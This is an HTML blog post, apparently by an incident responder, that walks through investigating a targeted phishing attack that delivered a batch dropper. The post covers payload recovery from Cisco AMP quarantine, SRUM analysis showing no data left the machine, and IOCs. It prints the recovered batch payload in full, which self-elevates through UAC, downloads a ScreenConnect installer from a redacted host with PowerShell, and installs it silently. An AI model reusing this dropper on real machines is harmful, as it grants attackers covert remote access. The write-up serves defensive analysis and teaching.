@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dissecting a ScreenConnect Phishing Attack | Jacob Rakai</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --border: #30363d;
+    --text: #c9d1d9;
+    --text-dim: #8b949e;
+    --accent: #58a6ff;
+    --accent-hover: #79c0ff;
+    --green: #3fb950;
+    --red: #f85149;
+    --yellow: #d29922;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+  }
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { color: var(--accent-hover); text-decoration: underline; }
+  .container { max-width: 760px; margin: 0 auto; padding: 0 20px; }
+  nav {
+    border-bottom: 1px solid var(--border);
+    padding: 16px 0;
+    margin-bottom: 40px;
+  }
+  nav .container { display: flex; justify-content: space-between; align-items: center; }
+  nav .logo { font-size: 18px; font-weight: 700; color: var(--text); }
+  nav .logo:hover { color: var(--accent); text-decoration: none; }
+  nav .links a { margin-left: 24px; color: var(--text-dim); font-size: 14px; }
+  nav .links a:hover { color: var(--text); }
+
+  /* POST */
+  .post-header { margin-bottom: 32px; }
+  .post-header h1 { font-size: 32px; line-height: 1.3; margin-bottom: 12px; }
+  .post-header .meta { font-size: 14px; color: var(--text-dim); }
+  .tag {
+    display: inline-block;
+    font-size: 11px;
+    padding: 2px 8px;
+    border-radius: 12px;
+    margin-right: 4px;
+    font-weight: 500;
+  }
+  .tag-ir { background: rgba(248,81,73,0.15); color: var(--red); }
+  .tag-dfir { background: rgba(210,153,34,0.15); color: var(--yellow); }
+  .tag-splunk { background: rgba(63,185,80,0.15); color: var(--green); }
+
+  article h2 {
+    font-size: 22px;
+    margin-top: 36px;
+    margin-bottom: 12px;
+    padding-bottom: 6px;
+    border-bottom: 1px solid var(--border);
+  }
+  article h3 {
+    font-size: 17px;
+    margin-top: 24px;
+    margin-bottom: 8px;
+  }
+  article p {
+    margin-bottom: 14px;
+    font-size: 15px;
+  }
+  article ul, article ol {
+    margin: 8px 0 16px 24px;
+    font-size: 15px;
+  }
+  article li { margin-bottom: 6px; }
+  code {
+    font-family: 'Consolas', 'Fira Code', monospace;
+    font-size: 13px;
+    background: var(--surface);
+    padding: 2px 6px;
+    border-radius: 3px;
+    border: 1px solid var(--border);
+  }
+  pre {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 12px 0 16px;
+    font-size: 13px;
+    line-height: 1.5;
+  }
+  pre code {
+    background: none;
+    border: none;
+    padding: 0;
+  }
+  .callout {
+    border-left: 3px solid var(--accent);
+    background: var(--surface);
+    padding: 12px 16px;
+    margin: 16px 0;
+    font-size: 14px;
+    border-radius: 0 6px 6px 0;
+  }
+  .callout-warn {
+    border-left-color: var(--yellow);
+  }
+  .callout-good {
+    border-left-color: var(--green);
+  }
+  .callout-bad {
+    border-left-color: var(--red);
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 12px 0 16px;
+    font-size: 14px;
+  }
+  th {
+    background: var(--surface);
+    text-align: left;
+    padding: 8px 12px;
+    border-bottom: 2px solid var(--border);
+    font-weight: 600;
+  }
+  td {
+    padding: 6px 12px;
+    border-bottom: 1px solid var(--border);
+  }
+  .mono { font-family: 'Consolas', monospace; font-size: 13px; }
+  footer {
+    margin-top: 60px;
+    padding: 20px 0;
+    border-top: 1px solid var(--border);
+    text-align: center;
+    font-size: 13px;
+    color: var(--text-dim);
+  }
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="container">
+    <a href="/" class="logo">jacobrakai</a>
+    <div class="links">
+      <a href="/">posts</a>
+      <a href="/about.html">about</a>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="post-header">
+    <h1>Dissecting a ScreenConnect Phishing Attack: From Bat File to SRUM Analysis</h1>
+    <div class="meta">
+      March 17, 2026 &middot; 12 min read<br>
+      <span class="tag tag-ir">incident response</span>
+      <span class="tag tag-dfir">DFIR</span>
+      <span class="tag tag-splunk">splunk</span>
+    </div>
+  </div>
+
+  <article>
+
+    <p>A targeted phishing campaign hit our org with emails crafted specifically for internal distribution lists &mdash; the attackers knew our DL names, department structure, and even individual council members' names. One user clicked. Here's the full investigation, from initial detection to payload recovery to proving no data left the building.</p>
+
+    <p>Names, domains, and identifiers have been sanitized.</p>
+
+    <h2>Initial Detection</h2>
+
+    <p>Cisco Secure Endpoint (AMP) fired on a malicious file download &mdash; <code>W32.06B3AF2617-90.SBX.TG</code>, disposition Malicious, risk score 100. The file was <code>Doc38964834-PDF.bat</code>, downloaded via Chrome to a user's Downloads folder. AMP logged 17 threat detections, 10 quarantine failures, and 7 successful quarantines over the next hour.</p>
+
+    <p>The machine was immediately isolated from the network and the AD computer object was disabled. We killed all Chrome processes remotely via CIM/DCOM and started pulling AMP trajectory data through the API.</p>
+
+    <h2>The Phishing Campaign</h2>
+
+    <p>Barracuda email logs showed a coordinated campaign &mdash; 7 emails from different addresses on a single compromised domain, all sent at the same timestamp, all routed through Google's smtp-relay. Subject lines were AP/invoice lures with unique reference numbers.</p>
+
+    <p>4 out of 7 emails made it through. Barracuda scored them at 1.2 against a kill threshold of 3.0. The other 3 were blocked with scores of 4.5 and 9.5. The attackers hit distribution lists (Legal, Operations), a shared mailbox, and a council member directly. 16 users were potentially exposed.</p>
+
+    <div class="callout callout-warn">The phishing emails were targeted. The attackers knew our distribution list names and org structure. This wasn't spray-and-pray.</div>
+
+    <h2>Attack Chain</h2>
+
+    <p>Chrome history and AMP trajectory gave us the full chain:</p>
+
+    <ol>
+      <li>User receives phishing email with link to <code>beaglermap[.]com</code></li>
+      <li>Landing page disguised as "View &amp; Sign Form" (DocuShare lookalike)</li>
+      <li>Page delivers <code>Doc38964834-PDF.bat</code> (1,486 bytes)</li>
+      <li>Bat file connects to C2 at <code>nacionalrastreamento[.]com[.]br</code></li>
+      <li>Payload attempts to download and silently install ScreenConnect from a Cloudflare R2 bucket</li>
+    </ol>
+
+    <h2>Recovering the Payload</h2>
+
+    <p>AMP quarantined the bat file before it could finish executing, and the file was no longer on disk. But AMP's quarantine vault stores copies.</p>
+
+    <p>We found 7 quarantined copies in <code>C:\Program Files\Cisco\AMP\Quarantine\</code>. AMP encrypts quarantine files, but it's just single-byte XOR. A quick Python script to try all 256 keys:</p>
+
+<pre><code>data = open('quarantined_file.qrt', 'rb').read()
+for key in range(256):
+    decoded = bytes([b ^ key for b in data])
+    if b'@echo' in decoded:
+        print(f'Key: 0x{key:02X}')
+        print(decoded.decode('ascii', errors='replace'))
+        break</code></pre>
+
+    <p>Key was <code>0x77</code>. The full payload:</p>
+
+<pre><code>@echo off
+setlocal EnableDelayedExpansion
+
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
+set "URL=https://[redacted].r2.dev/[path]/ScreenConnect.ClientSetup.msi"
+set "FILENAME=%TEMP%\ScreenConnect.ClientSetup.msi"
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"Invoke-WebRequest -Uri '%URL%' -OutFile '%FILENAME%'"
+
+msiexec /i "%FILENAME%" /qn /norestart
+del "%FILENAME%" /f /q</code></pre>
+
+    <p>It's an <strong>RMM tool abuse attack</strong>. The bat file tries to auto-elevate via UAC, downloads a ScreenConnect (ConnectWise Control) MSI from a Cloudflare R2 bucket, and silently installs it. Attacker gets persistent remote access through a legitimate remote management tool that blends in with normal IT software.</p>
+
+    <div class="callout callout-good"><strong>Good news:</strong> ScreenConnect was NOT installed. No files, services, or registry entries found. AMP caught the bat file before the MSI download completed. The UAC prompt also would have blocked it since the user wasn't a local admin.</div>
+
+    <h2>The Data Exposure Question</h2>
+
+    <p>Here's where it got serious. The compromised user works with child welfare cases. Chrome history showed they had been downloading confidential juvenile court documents, child welfare case files from the state DCYF managed file transfer, and tribal CPS safety plan recommendations &mdash; including files with named minors. All of this in the days surrounding the infection.</p>
+
+    <p>The machine also had 5 mapped network drives, including shares for legal documents and court case attachments. The question: did any of this data get out?</p>
+
+    <h2>SRUM Analysis</h2>
+
+    <p>The <strong>System Resource Usage Monitor (SRUM)</strong> database tracks per-process network byte counts in hourly buckets. It's stored as an ESE database at <code>C:\Windows\System32\sru\srudb.dat</code>. We copied it using VSS and parsed it with <a href="https://github.com/EricZimmerman/Srum">SrumECmd</a>.</p>
+
+    <p>Results for the infection hour (16:00-17:00 UTC, infection at 16:31):</p>
+
+    <table>
+      <tr><th>Process</th><th>Sent</th><th>Received</th><th>Notes</th></tr>
+      <tr><td class="mono">chrome.exe</td><td><strong>272 KB</strong></td><td>860 KB</td><td>Normal browsing</td></tr>
+      <tr><td class="mono">Teams</td><td>4 MB</td><td>109 MB</td><td>Meeting traffic</td></tr>
+      <tr><td class="mono">BITS</td><td>556 KB</td><td>98 MB</td><td>Windows updates</td></tr>
+      <tr><td class="mono">DoSvc</td><td>28 MB</td><td>355 KB</td><td>Delivery Optimization</td></tr>
+      <tr><td class="mono">SMB</td><td>10 MB</td><td>3.8 MB</td><td>Network shares</td></tr>
+    </table>
+
+    <p><strong>Chrome sent only 272 KB during the infection hour.</strong> You cannot exfiltrate CPS case files or court documents in 272 KB. No unknown or suspicious processes appeared with network activity. All traffic was attributed to known legitimate applications.</p>
+
+    <p>The following hour showed Chrome sending 36 MB / receiving 123 MB &mdash; but Chrome history confirmed the user was downloading court PDFs from a legal e-filing platform during that window. Normal activity.</p>
+
+    <div class="callout callout-good">SRUM is the strongest artifact we had. Without it, we would have been stuck at "can't prove it, can't disprove it." With it, we could confidently say no significant data left the machine.</div>
+
+    <h2>False Positives</h2>
+
+    <p>Two things flagged in the AMP trajectory that turned out to be nothing:</p>
+
+    <p><strong>rpcnet.exe</strong> in <code>C:\Windows\SysWOW64\</code> &mdash; registered as a Windows service, looked like malware persistence. Turned out to be the legitimate Absolute Software (Computrace) endpoint agent. Verified by checking the digital signature: valid EV code signing cert from Absolute Software Corp. Sandbox analysis confirmed it &mdash; 7/10 score because endpoint management tools trigger the same heuristics as malware (persistence, privilege escalation, system modification).</p>
+
+    <p><strong>Port 33370 connections</strong> to internal IPs &mdash; looked like lateral movement. Traced to <code>ldiscnupdate.exe</code>, the LANDesk/Ivanti endpoint management agent. Normal management traffic.</p>
+
+    <h2>Forensic Imaging</h2>
+
+    <p>We imaged the 512GB NVMe using CAINE (forensic Linux distro) via Ventoy on a USB drive. This was on a Dell Pro 16 Plus with a brand new chipset, which caused some fun:</p>
+
+    <ul>
+      <li><strong>Porteus 5.0</strong> &mdash; kernel too old for the I2C-HID keyboard controller. Internal and external keyboards both dead. System locked up.</li>
+      <li><strong>Paladin</strong> &mdash; locked up before GRUB even loaded. Tried RAID/AHCI switch, disabled VMD, different USB ports. Nothing worked.</li>
+      <li><strong>CAINE via Ventoy</strong> &mdash; booted successfully. Guymager for E01 imaging to an ext4 partition on an 8TB external drive.</li>
+    </ul>
+
+    <p>Lesson: always have multiple forensic distros ready. New hardware will break at least one of them.</p>
+
+    <h2>Standing Up Auditing Mid-Incident</h2>
+
+    <p>When we tried to check file server access logs to see what the user had accessed on the court case attachment shares, we found... nothing. Zero Security events. File access auditing wasn't enabled on any of our file servers.</p>
+
+    <p>So we fixed it during the incident:</p>
+
+    <ol>
+      <li><strong>auditpol</strong> &mdash; enabled File System, File Share, and Detailed File Share auditing (Success + Failure)</li>
+      <li><strong>SACLs</strong> &mdash; set audit rules on sensitive share paths (child welfare, legal, court, prosecutors)</li>
+      <li><strong>Splunk Universal Forwarder</strong> &mdash; deployed to all file servers, forwarding Security event logs</li>
+    </ol>
+
+    <p>Within 30 minutes we had 228K file access events flowing into Splunk. One user was generating 174K events alone &mdash; turned out to be Cisco AMP's <code>sfc.exe</code> scanner hitting the shared drive. Added a filter to exclude AMP scanner noise.</p>
+
+<pre><code>index=* (host=fileserver*) EventCode=5145
+  NOT Process_Name="*\\sfc.exe"
+  NOT Account_Name="*$"
+| stats count by Account_Name, Share_Name
+| sort -count</code></pre>
+
+    <p>Not ideal to be deploying monitoring during an IR, but the alternative was having zero visibility for the next incident too.</p>
+
+    <h2>Key Takeaways</h2>
+
+    <ul>
+      <li><strong>SRUM is invaluable.</strong> Per-process network byte counts in hourly buckets. It's the difference between "we don't know" and "we know." Collect it early &mdash; <code>esentutl /y /vss</code> to copy the locked file.</li>
+      <li><strong>AMP quarantine files are recoverable.</strong> Single-byte XOR encryption. Don't assume the payload is gone just because AMP quarantined it.</li>
+      <li><strong>RMM tool abuse is the new RAT.</strong> ScreenConnect, AnyDesk, TeamViewer &mdash; attackers use legitimate tools because they blend in. Block unauthorized RMM tools at the policy level.</li>
+      <li><strong>Targeted phishing is hard to stop at the gateway.</strong> A spam score of 1.2 against a threshold of 3.0 means the email looked legit. DKIM passed. SPF passed. The only defense was user awareness, and one out of 16 users clicked.</li>
+      <li><strong>File access auditing should be on before you need it.</strong> We got lucky with SRUM. Next time we might not have that artifact, and we'd need the file server logs to answer the exfil question.</li>
+      <li><strong>Have multiple forensic boot options.</strong> Modern hardware breaks old kernels. Ventoy with CAINE, Paladin, and Porteus on one USB is the way to go.</li>
+    </ul>
+
+    <h2>IOCs</h2>
+
+    <table>
+      <tr><th>Type</th><th>Value</th></tr>
+      <tr><td>SHA-256</td><td class="mono">06b3af2617c9cc5a82542501251ee62f53a1328f8638ba40faf0ccc094e50111</td></tr>
+      <tr><td>C2 IP</td><td class="mono">177.11.54[.]203:443</td></tr>
+      <tr><td>C2 Domain</td><td class="mono">nacionalrastreamento[.]com[.]br</td></tr>
+      <tr><td>Phishing Domain</td><td class="mono">beaglermap[.]com</td></tr>
+      <tr><td>Email Domain</td><td class="mono">doctormorton[.]com</td></tr>
+      <tr><td>Hosting</td><td class="mono">Cloudflare R2 (reported to abuse)</td></tr>
+    </table>
+
+    <h2>Tools Used</h2>
+
+    <ul>
+      <li>Cisco Secure Endpoint (AMP) &mdash; detection + trajectory API</li>
+      <li>CAINE + Guymager &mdash; forensic imaging</li>
+      <li>SrumECmd (Eric Zimmerman) &mdash; SRUM database parsing</li>
+      <li>Python &mdash; XOR decryption of quarantine files, Chrome history (sqlite3)</li>
+      <li>Splunk Universal Forwarder &mdash; file access monitoring</li>
+      <li>Barracuda ESG &mdash; email log analysis</li>
+      <li>PowerShell + CIM/DCOM &mdash; remote triage</li>
+    </ul>
+
+  </article>
+</div>
+
+<footer>
+  <div class="container">
+    &copy; 2026 Jacob Rakai &middot; <a href="/">back to posts</a>
+  </div>
+</footer>
+
+</body>
+</html>
